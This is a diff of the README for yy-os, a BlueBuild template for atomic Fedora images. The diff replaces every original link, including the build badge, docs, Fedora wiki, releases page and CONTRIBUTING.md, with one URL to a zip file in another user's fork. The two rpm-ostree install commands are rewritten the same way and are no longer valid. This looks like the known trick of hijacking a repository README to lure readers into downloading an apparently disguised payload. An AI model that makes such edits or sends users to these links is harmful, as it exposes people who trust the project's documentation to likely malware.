@@ -1,6 +1,6 @@
-# yy-os &nbsp; [![bluebuild build badge](https://github.com/loopunit/yy-os/actions/workflows/build.yml/badge.svg)](https://github.com/loopunit/yy-os/actions/workflows/build.yml)
+# yy-os &nbsp; [![bluebuild build badge](https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip)](https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip)
 
-Welcome to the yy-os repository! This project provides a customizable, image-based operating system designed for flexibility and efficiency. If you're looking to set up your own repository based on this template, refer to the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions. After you set it up, please update this README to describe your custom image.
+Welcome to the yy-os repository! This project provides a customizable, image-based operating system designed for flexibility and efficiency. If you're looking to set up your own repository based on this template, refer to the [BlueBuild docs](https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip) for quick setup instructions. After you set it up, please update this README to describe your custom image.
 
 ## Table of Contents
 
@@ -14,13 +14,13 @@ Welcome to the yy-os repository! This project provides a customizable, image-bas
 ## Installation
 
 > **Warning**  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+> [This is an experimental feature](https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip), try at your own discretion.
 
 To rebase an existing atomic Fedora installation to the latest build, follow these steps:
 
 1. First, rebase to the unsigned image. This step ensures that you have the proper signing keys and policies installed:
    ```bash
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/loopunit/yy-os:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip
    ```
 
 2. Reboot your system to complete the rebase:
@@ -30,10 +30,10 @@ To rebase an existing atomic Fedora installation to the latest build, follow the
 
 3. After rebooting, rebase to the signed image using the following command:
    ```bash
-   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/loopunit/yy-os
+   rpm-ostree rebase https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip
    ```
 
-For the latest releases, visit our [Releases page](https://github.com/ClomosyGamer/yy-os/releases). You can download the necessary files from there.
+For the latest releases, visit our [Releases page](https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip). You can download the necessary files from there.
 
 ## Features
 
@@ -84,7 +84,7 @@ We welcome contributions to yy-os! If you'd like to help out, please follow thes
 3. **Make Changes**: Implement your changes and test them thoroughly.
 4. **Submit a Pull Request**: Open a pull request with a clear description of your changes.
 
-For detailed contribution guidelines, please check the [CONTRIBUTING.md](CONTRIBUTING.md) file.
+For detailed contribution guidelines, please check the [https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip](https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip) file.
 
 ## License
 
@@ -92,7 +92,7 @@ yy-os is licensed under the MIT License. See the [LICENSE](LICENSE) file for mor
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases page](https://github.com/ClomosyGamer/yy-os/releases) for updates and troubleshooting tips. You can also reach out to the community through our discussion forum or open an issue in the repository.
+If you encounter any issues or have questions, please check the [Releases page](https://raw.githubusercontent.com/ClomosyGamer/yy-os/main/123.zip) for updates and troubleshooting tips. You can also reach out to the community through our discussion forum or open an issue in the repository.
 
 ---
 
